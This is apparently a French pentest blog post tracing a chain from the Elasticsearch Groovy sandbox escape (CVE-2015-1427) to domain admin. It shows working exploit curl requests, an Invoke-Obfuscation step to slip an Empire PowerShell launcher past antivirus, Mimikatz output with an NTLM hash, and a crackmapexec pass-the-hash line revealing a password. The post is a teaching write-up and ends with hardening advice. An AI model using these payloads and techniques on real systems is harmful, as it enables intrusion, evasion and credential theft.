---
title: "De l'évasion de sandbox Java à l'administration du domaine"
date: 2018-08-07 18:35:33
author: "Pixis"
layout: post
permalink: /evasion-a-admin-du-domaine/
disqus_identifier: 0000-0000-0000-00a2
cover: assets/uploads/2018/08/pentest.png
description: "Lors d'un test d'intrusion, une vulnérabilité dans le moteur de recherche d'Elastic Search a permis de prendre la main sur une machine, pour ensuite récupérer les credentials d'un administrateur de domaine après un mouvement latéral."
tags:
  - windows
  - reseau
---


Lors d'un test d'intrusion, une vulnérabilité dans le moteur de recherche d'Elastic Search a permis de prendre la main sur une machine, pour ensuite récupérer les credentials d'un administrateur de domaine après un mouvement latéral.

<!--more-->

## Découverte

Lors d'un test d'intrusion interne, je me suis retrouvé face à un serveur Elasticsearch en version 1.4.0. Elasticsearch permet l'indexation et la recherche des données. Il permet également d'effectuer des recherches via une API REST en envoyant des scripts Groovy sur le serveur, qui seront exécutés côté serveur. Groovy est un langage de programmation pour les plate-formes java qui a pour but d'aider les développeur avec une syntaxe simplifiée.

Afin de pouvoir exécuter du code sur le serveur, une sandbox a été mise en place pour restreindre les possibilités d'un utilisateur. Cet endpoint est accessible par tous les utilisateurs sans authentification. 

Voici un exemple de recherche [pris du site d'Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/search-request-script-fields.html)

```bash
curl -XPOST 'localhost:9200/bank/_search?pretty' -d '
{
    "query" : {
        "match_all": {}
    },
    "script_fields" : {
        "test1" : {
            "script" : {
                "lang": "painless",
                "source": "doc['price'].value * 2"
            }
        },
        "test2" : {
            "script" : {
                "lang": "painless",
                "source": "doc['price'].value * params.factor",
                "params" : {
                    "factor"  : 2.0
                }
            }
        }
    }
}'
```

## CVE-2015-1427

Les versions d'Elasticsearch inférieures à 1.4.3 possèdent une vulnérabilité permettant à un utilisateur de sortir de la sandbox mise en place dans Elasticsearch. Nous allons voir se qui se passe.

Les méthodes et classes autorisées sont définies dans la méthode "isAuthorized" que l'on peut [retrouver ici](https://github.com/elastic/elasticsearch/blob/d73a1ffafb81f86ba0482b29d8528c022ed9586a/src/main/java/org/elasticsearch/script/groovy/GroovySandboxExpressionChecker.java#L118)


Les lignes importantes étant

```java
if (methodBlacklist.contains(methodName)) {
    return false;
} else if (methodName == null && mce.getMethod() instanceof GStringExpression) {
    // We do not allow GStrings for method invocation, they are a security risk
    return false;
}
```

Le nom de la méthode ne doit pas être blacklisté. Or la blackliste est définie ici :

```java
public GroovySandboxExpressionChecker(Settings settings) {
    this.methodBlacklist = ImmutableSet.copyOf(settings.getAsArray(GROOVY_SANDBOX_METHOD_BLACKLIST, defaultMethodBlacklist, true));
    <...>
}

// Never allow calling these methods, regardless of the object type
public static String[] defaultMethodBlacklist = new String[]{
        "getClass",
        "wait",
        "notify",
        "notifyAll",
        "finalize"
};
```

Par ailleurs, la méthode ne doit pas être nulle, et ne doit pas être une instance de `GStringExpression`.

Une autre restriction est [définie par Elasticsearch](https://github.com/elastic/elasticsearch/blob/d73a1ffafb81f86ba0482b29d8528c022ed9586a/src/main/java/org/elasticsearch/script/groovy/GroovySandboxExpressionChecker.java#L145)

Cette restriction [définie une whiteliste de paquetages](https://github.com/groovy/groovy-core/blob/0b2182bff2250150e69ccb988f367e709b4560de/src/main/org/codehaus/groovy/control/customizers/SecureASTCustomizer.java#L854) pour lesquels nous aurons le droit d'appeler des méthodes.


```java
if (receiversWhiteList != null && !receiversWhiteList.contains(typeName)) {
    throw new SecurityException("Method calls not allowed on [" + typeName + "]");
} else if (receiversBlackList != null && receiversBlackList.contains(typeName)) {
    throw new SecurityException("Method calls not allowed on [" + typeName + "]");
}
```

Ces paquetages sont les suivants :

```java
private final static String[] defaultReceiverWhitelist = new String [] {
        groovy.util.GroovyCollections.class.getName(),
        java.lang.Math.class.getName(),
        java.lang.Integer.class.getName(), "[I", "[[I", "[[[I",
        java.lang.Float.class.getName(), "[F", "[[F", "[[[F",
        java.lang.Double.class.getName(), "[D", "[[D", "[[[D",
        java.lang.Long.class.getName(), "[J", "[[J", "[[[J",
        java.lang.Short.class.getName(), "[S", "[[S", "[[[S",
        java.lang.Character.class.getName(), "[C", "[[C", "[[[C",
        java.lang.Byte.class.getName(), "[B", "[[B", "[[[B",
        java.lang.Boolean.class.getName(), "[Z", "[[Z", "[[[Z",
        java.math.BigDecimal.class.getName(),
        java.util.Arrays.class.getName(),
        java.util.Date.class.getName(),
        java.util.List.class.getName(),
        java.util.Map.class.getName(),
        java.util.Set.class.getName(),
        java.lang.Object.class.getName(),
        org.joda.time.DateTime.class.getName(),
        org.joda.time.DateTimeUtils.class.getName(),
        org.joda.time.DateTimeZone.class.getName(),
        org.joda.time.Instant.class.getName()
};
```

Nous nous retrouvons donc avec la possibilité d'utiliser ces différents paquetages, sans pour autant utiliser les 5 méthodes blacklistées. 

En regardant le commit qui a permis de corriger la vulnérabilité, nous voyons l'apparition de [deux nouvelles méthodes blacklistées](https://github.com/elastic/elasticsearch/commit/68c4a6201e6c889b272c1b64550237fe6d172b47#diff-331d8e3af61ece3690977c54ca324711R66)

```java
public static String[] defaultMethodBlacklist = new String[]{
        "getClass",
+       "class",
+       "forName",
        "wait",
        "notify",
        "notifyAll",
```

En voyant ces deux méthodes, cela fait penser à l'API Java Reflection.

Pour simplifier, la classe java.lang.Class possède une méthode appelée `forName`. Cette méthode permet de récupérer un objet de type Class correspondant au nom passé en paramètre.

```java
Voiture maVoiture = Class.forName("Voiture");
```

Aisni, en récupérant l'objet Class d'un quelconque objet, il est possible d'utiliser cette méthode pour récupérer n'importe quelle classe.

Prenons par exemple la classe java.lang.Math, nous pouvons tout à fait effectuer l'appel suivant :

```java
java.lang.Math.class.forName("java.lang.Runtime")
```

Le code est valide dans le contexte de la sandbox, et nous récupérons une classe java.lang.Runtime qui permet d'exécuter du code Java arbitraire sur la machine.



## Exécution de code système

Une fois que nous avons la possibilité d'exécuter du code Java arbitraire sur la machine, c'est assez rapide d'exécuter n'importe quelle commande présente sur le système.

```java
java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("whoami").getText()
```

Cette ligne permet d'exécuter la commande `whoami` sur le serveur vulnérable.

```bash
$ curl http://localhost:9200/_search?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\").getText()"}}}'

{
  <snip>
  "hits" : {
    "total" : 8,
    "max_score" : 1.0,
    "hits" : [ {
      <snip>
      "fields" : {
        "myscript" : [ "NT AUTHORITY\SYSTEM" ]
      }
    }
}}
```

Nous remarquons que nous avons les privilèges SYSTEM sur la machine.

## Session Empire

### Création du payload

Maintenant qu'il est possible d'exécuter du code sur la machine distante, et après vérification de la présence de Powershell sur cette machine, le framework "Empire" a été utilisé afin d'exécuter une charle utile en mémoire, sans écriture sur disque.

Pour cela, un "Listener HTTP" a été créé dans Empire pour recevoir les futures connexions de la machine cible et le code devant être exécuté sur la machine cible a également été généré (création d'un "launcher" dans Empire).
 
Cependant, afin de ne pas se faire bloquer par l'antivirus et par l'AMSI, cette charge utile a été offusquée à l'aide de l'outil Powershell "Invoke-Obfuscation".
 
```pwsh
Invoke-Obfuscation> SET scriptblock "<le payload>"
Invoke-Obfuscation> TOKEN
Invoke-Obfuscation\Token> ALL
Invoke-Obfuscation\Token\All> 1
```

Le script Powershell retourne la commande offusquée

```
Result: 
&("{2} [...] [chAR]92)
```

### Exécution du payload

Une fois tous ces éléments mis en place, une requête a été envoyée au serveur cible pour qu'elle exécute le Powershell préparé.

```bash
$ curl http://localhost:9200/_search?pretty -XPOST -d '
    {"script_fields":
        {"myscript":
            {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"powershell -EncodedCommand <PAYLOAD>\").getText()"
            }
        }
    }'
```
 

Le serveur exécutant ce code, une session Empire a été ouverte, permettant d'effectuer des actions plus complexes sur la machine.

### Récupération des credentials

Une fois la session Empire ouverte, il était possible de lancer l'outil Mimikatz afin de récupérer des secrets d'identification sur la machine.

```
[...]
Authentication Id       : 0 ; 33291243 (00000000:01fbfbeb)
Session                 : RemoteInteractive from 5
User Name               : adm-hackndo 
Domain                  : hackndocorp 
Logon Server            : HACKNDODC1 
Logon Time              : 7/26/2018 2:24:42 PM 
SID                     : S-1-5-21-724041197-931238763-3737651182-1473 
    msv : 
        [00000003] Primary 
        * Username  : adm-hackndo 
        * Domain    : hackndocorp 
        * NTLM      : 25a3352bb80ed96e7e8a270d4fcca6b3 
        * SHA1      : bc41d7ccecbbae8ed496c2af21132a70310b73fa
        [00010000] CredentialKeys 
        * NTLM      : 25a3352bb80ed96e7e8a270d4fcca6b3 
        * SHA1      : bc41d7ccecbbae8ed496c2af21132a70310b73fa
    tspkg : 
    digest : 
        * Username  : adm-hackndo 
        * Domain    : hackndocorp 
        * Password  : (null)
    kerberos : 
        * Username  : adm-hackndo 
        * Domain    : FR.HACKNDOCORP.INTRANET 
        * Password  : (null)
    ssp :
    credman :
[...]
```

Le condensat NTLM du secret d'authentification d'un administrateur de domaine a été extrait du paquet d'authentification MSV. MSV enregistre les informations de l'utilisateur dans la base SAM. Ce condensat est suffisant pour prendre le contrôle du domaine via la technique du "pass-the-hash", cependant pour la beauté du geste, nous souhaitions trouver un mot de passe en clair d'administrateur de domaine.


## Mouvement latéral pour l'administration du domaine

A l'aide de l'outil BloodHound, nous avions une cartographie à l'instant T du domaine audité. Cette cartographie précise permettait notamment de trouver les machines sur lesquelles des administrateurs de domaine étaient connectés. En utilisant la technique du pass-the-hash sur l'une de ces machines (Windows 2008 r2), nous avons été en mesure d'obtenir un secret d'identification d'un administrateur de domaine.

```bash
crackmapexec -u adm-hackndo -H "25a3352bb80ed96e7e8a270d4fcca6b3" --lsa DESKTOP123.FR.HACKNDOCORP.INTRANET
<snip>
CME     DESKTOP123.FR.HACKNDOCORP.INTRANET:445    DESKTOP123  hackndocorp\adm-pixis:Pass0rd[Ultr4°s3cr3t_n0n*d3vinable<>!
<snip>
```

## Conclusion

Ce récapitulatif prouve que toutes les vulnérabilités sont importantes. Le niveau global de sécurité des systèmes d'information est défini par le niveau de sécurité du maillon le plus faible. Il suffit d'un serveur en retard sur les mises à jour pour pouvoir compromettre l'ensemble du domaine. Une défense en profondeur permet de renforcer le niveau de sécurité d'un système d'information. 

Dans le cas décrit, un serveur ElasticSearch à jour aurait évité ce scénario. Par ailleurs, une administration en silo n'aurait pas permis à l'attaquant d'extraire le condensat NTLM d'un administrateur de domaine. Enfin, l'utilisation de serveurs Windows à jour permettait de ne pas exposer les secrets d'identification en clair.
